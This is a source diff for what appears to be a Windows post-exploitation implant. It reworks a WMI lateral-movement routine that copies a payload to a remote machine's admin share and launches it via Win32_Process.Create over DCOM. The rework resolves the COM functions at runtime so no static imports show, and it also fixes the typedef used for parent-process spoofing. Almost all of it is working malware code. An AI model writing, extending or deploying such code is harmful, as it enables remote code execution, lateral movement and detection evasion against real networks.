@@ -1189,11 +1189,165 @@ static BOOL _jump_scshell(Buffer *out, const wchar_t *target,
     return TRUE;
 }
 
+/* ─── COM/WMI types for MinGW (WIN32_LEAN_AND_MEAN strips these) ───
+ * All COM functions resolved dynamically from ole32/oleaut32 at runtime.
+ * WMI COM vtable structs defined manually to avoid wbemcli.h dependency. */
+
+/* COM constants */
+#ifndef COINIT_MULTITHREADED
+#define COINIT_MULTITHREADED 0x0
+#endif
+#ifndef CLSCTX_INPROC_SERVER
+#define CLSCTX_INPROC_SERVER 0x1
+#endif
+#ifndef EOAC_NONE
+#define EOAC_NONE 0
+#endif
+#ifndef RPC_C_AUTHN_LEVEL_DEFAULT
+#define RPC_C_AUTHN_LEVEL_DEFAULT 0
+#endif
+#ifndef RPC_C_AUTHN_LEVEL_CALL
+#define RPC_C_AUTHN_LEVEL_CALL 3
+#endif
+#ifndef RPC_C_IMP_LEVEL_IMPERSONATE
+#define RPC_C_IMP_LEVEL_IMPERSONATE 3
+#endif
+#ifndef RPC_C_AUTHN_WINNT
+#define RPC_C_AUTHN_WINNT 10
+#endif
+#ifndef RPC_C_AUTHZ_NONE
+#define RPC_C_AUTHZ_NONE 0
+#endif
+#ifndef RPC_E_CHANGED_MODE
+#define RPC_E_CHANGED_MODE ((HRESULT)0x80010106L)
+#endif
+#ifndef VT_BSTR
+#define VT_BSTR 8
+#endif
+#ifndef VT_I4
+#define VT_I4 3
+#endif
+
+/* OLE Automation types */
+#ifndef _WMI_BSTR_DEFINED
+#define _WMI_BSTR_DEFINED
+typedef wchar_t *_BSTR;
+#endif
+
+#ifndef _WMI_VARIANT_DEFINED
+#define _WMI_VARIANT_DEFINED
+typedef struct _wmi_VARIANT {
+    unsigned short vt;
+    unsigned short wR1, wR2, wR3;
+    union {
+        LONG intVal;
+        _BSTR bstrVal;
+        void *byref;
+        LONGLONG llVal;
+    };
+} _VARIANT;
+#endif
+
+/* IWbemLocator vtable (IUnknown + ConnectServer) */
+typedef struct {
+    HRESULT (STDMETHODCALLTYPE *QueryInterface)(void *, const GUID *, void **);
+    ULONG   (STDMETHODCALLTYPE *AddRef)(void *);
+    ULONG   (STDMETHODCALLTYPE *Release)(void *);
+    HRESULT (STDMETHODCALLTYPE *ConnectServer)(
+        void *This, _BSTR strNetworkResource, _BSTR strUser, _BSTR strPassword,
+        _BSTR strLocale, LONG lSecurityFlags, _BSTR strAuthority,
+        void *pCtx, void **ppNamespace);
+} _IWbemLocatorVtbl;
+typedef struct { _IWbemLocatorVtbl *lpVtbl; } _IWbemLocator;
+
+/* IWbemServices vtable — 26 entries, we use GetObject[6] and ExecMethod[24] */
+typedef struct {
+    HRESULT (STDMETHODCALLTYPE *QueryInterface)(void *, const GUID *, void **);
+    ULONG   (STDMETHODCALLTYPE *AddRef)(void *);
+    ULONG   (STDMETHODCALLTYPE *Release)(void *);
+    void *OpenNamespace;
+    void *CancelAsyncCall;
+    void *QueryObjectSink;
+    HRESULT (STDMETHODCALLTYPE *GetObject)(
+        void *This, _BSTR strObjectPath, LONG lFlags, void *pCtx,
+        void **ppObject, void **ppCallResult);
+    void *GetObjectAsync;
+    void *PutClass;
+    void *PutClassAsync;
+    void *DeleteClass;
+    void *DeleteClassAsync;
+    void *CreateClassEnum;
+    void *CreateClassEnumAsync;
+    void *PutInstance;
+    void *PutInstanceAsync;
+    void *DeleteInstance;
+    void *DeleteInstanceAsync;
+    void *CreateInstanceEnum;
+    void *CreateInstanceEnumAsync;
+    void *ExecQuery;
+    void *ExecQueryAsync;
+    void *ExecNotificationQuery;
+    void *ExecNotificationQueryAsync;
+    HRESULT (STDMETHODCALLTYPE *ExecMethod)(
+        void *This, _BSTR strObjectPath, _BSTR strMethodName,
+        LONG lFlags, void *pCtx, void *pInParams,
+        void **ppOutParams, void **ppCallResult);
+    void *ExecMethodAsync;
+} _IWbemServicesVtbl;
+typedef struct { _IWbemServicesVtbl *lpVtbl; } _IWbemServices;
+
+/* IWbemClassObject vtable — we use Get[4], Put[5], SpawnInstance[15], GetMethod[19] */
+typedef struct {
+    HRESULT (STDMETHODCALLTYPE *QueryInterface)(void *, const GUID *, void **);
+    ULONG   (STDMETHODCALLTYPE *AddRef)(void *);
+    ULONG   (STDMETHODCALLTYPE *Release)(void *);
+    void *GetQualifierSet;
+    HRESULT (STDMETHODCALLTYPE *Get)(
+        void *This, const wchar_t *wszName, LONG lFlags,
+        _VARIANT *pVal, void *pType, void *plFlavor);
+    HRESULT (STDMETHODCALLTYPE *Put)(
+        void *This, const wchar_t *wszName, LONG lFlags,
+        _VARIANT *pVal, LONG vtType);
+    void *Delete;
+    void *GetNames;
+    void *BeginEnumeration;
+    void *Next;
+    void *EndEnumeration;
+    void *GetPropertyQualifierSet;
+    void *Clone;
+    void *GetObjectText;
+    void *SpawnDerivedClass;
+    HRESULT (STDMETHODCALLTYPE *SpawnInstance)(
+        void *This, LONG lFlags, void **ppNewInstance);
+    void *CompareTo;
+    void *GetPropertyOrigin;
+    void *InheritsFrom;
+    HRESULT (STDMETHODCALLTYPE *GetMethod)(
+        void *This, const wchar_t *wszName, LONG lFlags,
+        void **ppInSignature, void **ppOutSignature);
+} _IWbemClassObjectVtbl;
+typedef struct { _IWbemClassObjectVtbl *lpVtbl; } _IWbemClassObject;
+
+/* COM function pointer types for dynamic resolution */
+typedef HRESULT (WINAPI *fn_CoInitializeEx)(void *, DWORD);
+typedef void    (WINAPI *fn_CoUninitialize_t)(void);
+typedef HRESULT (WINAPI *fn_CoInitializeSecurity_t)(void *, LONG, void *, void *,
+        DWORD, DWORD, void *, DWORD, void *);
+typedef HRESULT (WINAPI *fn_CoCreateInstance_t)(const GUID *, void *, DWORD,
+        const GUID *, void **);
+typedef HRESULT (WINAPI *fn_CoSetProxyBlanket_t)(void *, DWORD, DWORD, wchar_t *,
+        DWORD, DWORD, void *, DWORD);
+typedef _BSTR   (WINAPI *fn_SysAllocString_t)(const wchar_t *);
+typedef void    (WINAPI *fn_SysFreeString_t)(_BSTR);
+typedef void    (WINAPI *fn_VariantInit_t)(_VARIANT *);
+typedef HRESULT (WINAPI *fn_VariantClear_t)(_VARIANT *);
+
 static BOOL _jump_wmiexec(Buffer *out, const wchar_t *target,
                           const unsigned char *payload, DWORD payload_len) {
     /* WMI lateral movement via COM/DCOM.
      * Upload payload to \\target\C$\Windows\Temp\<rand>.exe
-     * then execute via Win32_Process.Create over DCOM. */
+     * then execute via Win32_Process.Create over DCOM.
+     * All COM functions resolved dynamically — no static imports. */
 
     HMODULE hK32 = LoadLibraryA("kernel32.dll");
     HMODULE hOle = LoadLibraryA("ole32.dll");
@@ -1202,6 +1356,22 @@ static BOOL _jump_wmiexec(Buffer *out, const wchar_t *target,
 
     if (!hOle || !hOleaut) {
         BUF_STR(out, "[-] Failed to load COM libs\n");
+        return FALSE;
+    }
+
+    /* Resolve COM functions dynamically */
+    fn_CoInitializeEx pCoInitEx = (fn_CoInitializeEx)GetProcAddress(hOle, "CoInitializeEx");
+    fn_CoUninitialize_t pCoUninit = (fn_CoUninitialize_t)GetProcAddress(hOle, "CoUninitialize");
+    fn_CoInitializeSecurity_t pCoInitSec = (fn_CoInitializeSecurity_t)GetProcAddress(hOle, "CoInitializeSecurity");
+    fn_CoCreateInstance_t pCoCreate = (fn_CoCreateInstance_t)GetProcAddress(hOle, "CoCreateInstance");
+    fn_CoSetProxyBlanket_t pCoSetProxy = (fn_CoSetProxyBlanket_t)GetProcAddress(hOle, "CoSetProxyBlanket");
+    fn_SysAllocString_t pSysAlloc = (fn_SysAllocString_t)GetProcAddress(hOleaut, "SysAllocString");
+    fn_SysFreeString_t pSysFree = (fn_SysFreeString_t)GetProcAddress(hOleaut, "SysFreeString");
+    fn_VariantInit_t pVarInit = (fn_VariantInit_t)GetProcAddress(hOleaut, "VariantInit");
+    fn_VariantClear_t pVarClear = (fn_VariantClear_t)GetProcAddress(hOleaut, "VariantClear");
+
+    if (!pCoInitEx || !pCoCreate || !pSysAlloc || !pSysFree || !pVarInit) {
+        BUF_STR(out, "[-] Failed to resolve COM functions\n");
         return FALSE;
     }
 
@@ -1229,46 +1399,45 @@ static BOOL _jump_wmiexec(Buffer *out, const wchar_t *target,
     buf_append(out, msg, (DWORD)strlen(msg));
 
     /* 2. Initialize COM */
-    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
+    HRESULT hr = pCoInitEx(NULL, COINIT_MULTITHREADED);
     if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) {
         BUF_STR(out, "[-] CoInitializeEx failed\n");
         pDeleteFile(remotePath);
         return FALSE;
     }
 
-    hr = CoInitializeSecurity(NULL, -1, NULL, NULL,
-        RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE,
-        NULL, EOAC_NONE, NULL);
+    if (pCoInitSec)
+        pCoInitSec(NULL, -1, NULL, NULL,
+            RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE,
+            NULL, EOAC_NONE, NULL);
     /* May fail if already set — OK to ignore */
 
     /* 3. Connect to remote WMI via IWbemLocator */
-    IWbemLocator *pLoc = NULL;
-    /* CLSID_WbemLocator = {4590F811-1D3A-11D0-891F-00AA004B2E24} */
+    _IWbemLocator *pLoc = NULL;
     CLSID clsid_WbemLocator = {0x4590F811, 0x1D3A, 0x11D0,
         {0x89, 0x1F, 0x00, 0xAA, 0x00, 0x4B, 0x2E, 0x24}};
-    /* IID_IWbemLocator = {dc12a687-737f-11cf-884d-00aa004b2e24} */
     IID iid_IWbemLocator = {0xDC12A687, 0x737F, 0x11CF,
         {0x88, 0x4D, 0x00, 0xAA, 0x00, 0x4B, 0x2E, 0x24}};
 
-    hr = CoCreateInstance(&clsid_WbemLocator, NULL, CLSCTX_INPROC_SERVER,
-                          &iid_IWbemLocator, (void **)&pLoc);
+    hr = pCoCreate(&clsid_WbemLocator, NULL, CLSCTX_INPROC_SERVER,
+                   &iid_IWbemLocator, (void **)&pLoc);
     if (FAILED(hr)) {
         char err[128];
         snprintf(err, sizeof(err), "[-] CoCreateInstance(WbemLocator) failed: 0x%lx\n", hr);
         buf_append(out, err, (DWORD)strlen(err));
         pDeleteFile(remotePath);
-        CoUninitialize();
+        if (pCoUninit) pCoUninit();
         return FALSE;
     }
 
     /* Build resource path: \\target\root\cimv2 */
     wchar_t wmiPath[512];
     swprintf(wmiPath, 512, L"\\\\%ls\\root\\cimv2", target);
-    BSTR bstrPath = SysAllocString(wmiPath);
+    _BSTR bstrPath = pSysAlloc(wmiPath);
 
-    IWbemServices *pSvc = NULL;
-    hr = pLoc->lpVtbl->ConnectServer(pLoc, bstrPath, NULL, NULL, NULL, 0, NULL, NULL, &pSvc);
-    SysFreeString(bstrPath);
+    _IWbemServices *pSvc = NULL;
+    hr = pLoc->lpVtbl->ConnectServer(pLoc, bstrPath, NULL, NULL, NULL, 0, NULL, NULL, (void **)&pSvc);
+    pSysFree(bstrPath);
 
     if (FAILED(hr)) {
         char err[128];
@@ -1276,70 +1445,71 @@ static BOOL _jump_wmiexec(Buffer *out, const wchar_t *target,
         buf_append(out, err, (DWORD)strlen(err));
         pLoc->lpVtbl->Release(pLoc);
         pDeleteFile(remotePath);
-        CoUninitialize();
+        if (pCoUninit) pCoUninit();
         return FALSE;
     }
 
     /* Set security on proxy */
-    CoSetProxyBlanket((IUnknown *)pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
-        RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
+    if (pCoSetProxy)
+        pCoSetProxy((void *)pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
+            RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
 
     /* 4. Get Win32_Process class */
-    BSTR bstrClass = SysAllocString(L"Win32_Process");
-    BSTR bstrMethod = SysAllocString(L"Create");
+    _BSTR bstrClass = pSysAlloc(L"Win32_Process");
+    _BSTR bstrMethod = pSysAlloc(L"Create");
 
-    IWbemClassObject *pClass = NULL;
-    hr = pSvc->lpVtbl->GetObject(pSvc, bstrClass, 0, NULL, &pClass, NULL);
+    _IWbemClassObject *pClass = NULL;
+    hr = pSvc->lpVtbl->GetObject(pSvc, bstrClass, 0, NULL, (void **)&pClass, NULL);
     if (FAILED(hr)) {
         char err[128];
         snprintf(err, sizeof(err), "[-] GetObject(Win32_Process) failed: 0x%lx\n", hr);
         buf_append(out, err, (DWORD)strlen(err));
-        SysFreeString(bstrClass);
-        SysFreeString(bstrMethod);
+        pSysFree(bstrClass);
+        pSysFree(bstrMethod);
         pSvc->lpVtbl->Release(pSvc);
         pLoc->lpVtbl->Release(pLoc);
         pDeleteFile(remotePath);
-        CoUninitialize();
+        if (pCoUninit) pCoUninit();
         return FALSE;
     }
 
     /* Get method in-params */
-    IWbemClassObject *pInParams = NULL;
-    pClass->lpVtbl->GetMethod(pClass, bstrMethod, 0, &pInParams, NULL);
+    _IWbemClassObject *pInParams = NULL;
+    pClass->lpVtbl->GetMethod(pClass, L"Create", 0, (void **)&pInParams, NULL);
 
-    IWbemClassObject *pInInst = NULL;
-    pInParams->lpVtbl->SpawnInstance(pInParams, 0, &pInInst);
+    _IWbemClassObject *pInInst = NULL;
+    pInParams->lpVtbl->SpawnInstance(pInParams, 0, (void **)&pInInst);
 
     /* Set CommandLine = "C:\Windows\Temp\<rand>.exe" */
     wchar_t cmdLine[512];
     swprintf(cmdLine, 512, L"C:\\Windows\\Temp\\%hs.exe", rname);
-    VARIANT vCmd;
-    VariantInit(&vCmd);
+    _VARIANT vCmd;
+    pVarInit(&vCmd);
     vCmd.vt = VT_BSTR;
-    vCmd.bstrVal = SysAllocString(cmdLine);
+    vCmd.bstrVal = pSysAlloc(cmdLine);
     pInInst->lpVtbl->Put(pInInst, L"CommandLine", 0, &vCmd, 0);
 
     /* 5. Execute Win32_Process.Create */
-    IWbemClassObject *pOutParams = NULL;
+    _IWbemClassObject *pOutParams = NULL;
     hr = pSvc->lpVtbl->ExecMethod(pSvc, bstrClass, bstrMethod, 0, NULL,
-                                   pInInst, &pOutParams, NULL);
+                                   pInInst, (void **)&pOutParams, NULL);
 
     BOOL success = FALSE;
     if (SUCCEEDED(hr)) {
-        VARIANT vRet;
-        VariantInit(&vRet);
+        _VARIANT vRet;
+        pVarInit(&vRet);
         pOutParams->lpVtbl->Get(pOutParams, L"ReturnValue", 0, &vRet, NULL, NULL);
         int retVal = (vRet.vt == VT_I4) ? vRet.intVal : -1;
-        VariantClear(&vRet);
+        if (pVarClear) pVarClear(&vRet);
 
         if (retVal == 0) {
-            VARIANT vPid;
-            VariantInit(&vPid);
+            _VARIANT vPid;
+            pVarInit(&vPid);
             pOutParams->lpVtbl->Get(pOutParams, L"ProcessId", 0, &vPid, NULL, NULL);
             snprintf(msg, sizeof(msg), "[+] Process created on %ls (PID: %d)\n",
                      target, vPid.intVal);
             buf_append(out, msg, (DWORD)strlen(msg));
-            VariantClear(&vPid);
+            if (pVarClear) pVarClear(&vPid);
             success = TRUE;
         } else {
             snprintf(msg, sizeof(msg), "[-] Win32_Process.Create returned %d\n", retVal);
@@ -1352,15 +1522,15 @@ static BOOL _jump_wmiexec(Buffer *out, const wchar_t *target,
     }
 
     /* Cleanup COM */
-    VariantClear(&vCmd);
+    if (pVarClear) pVarClear(&vCmd);
     pInInst->lpVtbl->Release(pInInst);
     pInParams->lpVtbl->Release(pInParams);
     pClass->lpVtbl->Release(pClass);
-    SysFreeString(bstrClass);
-    SysFreeString(bstrMethod);
+    pSysFree(bstrClass);
+    pSysFree(bstrMethod);
     pSvc->lpVtbl->Release(pSvc);
     pLoc->lpVtbl->Release(pLoc);
-    CoUninitialize();
+    if (pCoUninit) pCoUninit();
 
     /* Schedule binary cleanup — give agent time to start */
     if (success) {
@@ -1868,7 +2038,7 @@ void mod_ppid(Buffer *out, const char *argstr) {
 
 /* Typedefs for dynamic API resolution */
 typedef BOOL (WINAPI *fn_InitPTAL)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD, SIZE_T *);
-typedef BOOL (WINAPI *fn_UpdatePTA)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, PVOID, SIZE_T, PVOID, SIZE_T *);
+typedef BOOL (WINAPI *fn_UpdatePTA)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD_PTR, PVOID, SIZE_T, PVOID, SIZE_T *);
 typedef void (WINAPI *fn_DeletePTAL)(LPPROC_THREAD_ATTRIBUTE_LIST);
 typedef BOOL (WINAPI *fn_CreateProcessW_t)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES,
         LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR,
@@ -2002,7 +2172,7 @@ void mod_spawn(Buffer *out, const unsigned char *args, DWORD args_len) {
         if (pAttrList && pInitPTAL(pAttrList, 1, 0, &attrSize)) {
             /* PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000 */
             if (pUpdatePTA(pAttrList, 0,
-                           (PVOID)0x00020000, /* PROC_THREAD_ATTRIBUTE_PARENT_PROCESS */
+                           (DWORD_PTR)0x00020000, /* PROC_THREAD_ATTRIBUTE_PARENT_PROCESS */
                            &hParent, sizeof(HANDLE), NULL, NULL)) {
 
                 STARTUPINFOEXW siex;
